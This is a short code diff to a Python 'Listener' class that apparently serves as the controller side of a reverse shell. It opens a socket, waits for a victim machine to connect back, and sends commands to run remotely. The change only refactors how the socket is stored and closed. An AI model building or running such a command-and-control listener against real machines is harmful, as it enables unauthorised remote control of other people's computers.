@@ -4,12 +4,12 @@ import socket, json
 
 class Listener:
     def __init__(self, ip, port):
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        listener.bind((ip, port))
-        listener.listen(0)
+        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.listener.bind((ip, port))
+        self.listener.listen(0)
         print("[+] Waiting for incoming connections.")
-        self.connection, address = listener.accept()
+        self.connection, address = self.listener.accept()
         print("[+] Got a connection from " + str(address))
 
     def reliable_send(self, data):
@@ -27,7 +27,7 @@ class Listener:
     def execute_remotely(self, command):
         self.reliable_send(command)
         if command[0] == "exit":
-            self.connection.close()
+            self.listener.close()
             exit()
         return self.reliable_receive()
 
